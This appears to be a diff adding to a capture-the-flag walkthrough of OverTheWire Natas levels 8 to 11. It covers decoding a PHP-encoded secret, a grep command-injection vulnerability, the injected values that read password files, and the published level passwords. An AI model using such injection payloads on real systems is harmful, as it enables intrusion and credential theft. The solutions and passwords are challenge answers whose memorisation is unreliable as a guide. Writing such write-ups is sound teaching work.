@@ -142,3 +142,93 @@ If we pass that path in the parameter, we get the password for the next level.
 Username: natas8
 Password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
 ```
+
+### Solution
+
+Checking the source code, we can see how the secret was encoded. So it is a matter of decoding it.
+
+```php
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+```
+
+1. base64 decode
+2. reverse string
+3. hex2bin
+
+```php
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function decodeSecret($secret) {
+    return base64_decode(strrev(hex2bin($secret)));
+}
+
+echo decodeSecret($encodedSecret);
+
+```
+
+Refs:
+* https://www.php.net/manual/en/function.bin2hex.php
+* https://www.php.net/manual/en/function.strrev
+* https://www.php.net/manual/es/function.base64-encode
+
+## [Level 9](http://natas9.natas.labs.overthewire.org) Injection
+
+```
+Username: natas9
+Password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+```
+
+**Source code:**
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+```
+
+### Solution
+
+Get the following command to make the terminal give us the password for next level. It tells grep to look for any matches on a given location, thus, we use the pass location.
+
+```
+. /etc/natas_webpass/natas10 &
+```
+
+Refs:
+* https://www.php.net/manual/en/function.passthru.php
+* https://www.php.net/manual/en/function.array-key-exists.php
+* https://www.php.net/manual/en/reserved.variables.request.php
+
+## [Level 10](http://natas10.natas.labs.overthewire.org)
+
+```
+Username: natas10
+Password: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+```
+
+### Solution
+
+Same as before, but this time we are not allowed to use &, I guess no problem...
+
+```
+. /etc/natas_webpass/natas11
+```
+
+## [Level 11](http://natas11.natas.labs.overthewire.org)
+
+```
+Username: natas11
+Password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+```
